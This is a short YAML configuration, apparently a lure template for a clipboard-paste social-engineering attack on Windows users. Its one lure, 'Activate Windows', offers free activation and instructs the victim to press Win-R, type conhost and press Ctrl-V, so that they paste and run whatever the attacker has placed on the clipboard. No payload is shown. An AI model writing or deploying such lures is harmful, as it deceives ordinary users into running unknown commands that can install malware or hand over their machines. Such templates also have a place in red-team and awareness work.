platform: windows
presentation: cli
lures:
  - nickname: "Activate Windows"
    preamble: >
      Activate Windows for free with these steps:
    steps:
      - "Press **Win-R** on your keyboard."
      - "Type **`conhost`** and press **Enter**."
      - "Press **Ctrl-V** to paste the desired configuration."
